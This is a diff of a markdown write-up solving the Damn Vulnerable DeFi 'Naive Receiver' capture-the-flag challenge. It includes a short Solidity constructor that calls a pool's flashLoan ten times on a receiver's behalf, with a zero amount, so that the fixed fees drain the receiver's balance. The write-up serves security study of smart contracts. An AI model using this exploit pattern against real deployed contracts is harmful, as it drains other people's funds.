@@ -1,3 +1,5 @@
+### [Task Contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/naive-receiver)
+
 ### Task
 
 >There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.
@@ -18,11 +20,11 @@
 
 ### Steps
 
-- Write a for loop that calls the lender contracts `flashLoan` function on the naive receivers behalf...10 times.
+- Write a for loop that calls the lender contracts `flashLoan` function on the naive receivers behalf...10 times. Doesn't even need to borrow a value > 0.
 
 ```
 constructor(address payable poolAddress, address receiverAddress) {
-        for (uint256 i = 0; i <= 9; i++) {
+        for (uint256 i = 0; i < 10; i++) {
             NaiveReceiverLenderPool(poolAddress).flashLoan(receiverAddress, 0);
         }
     }
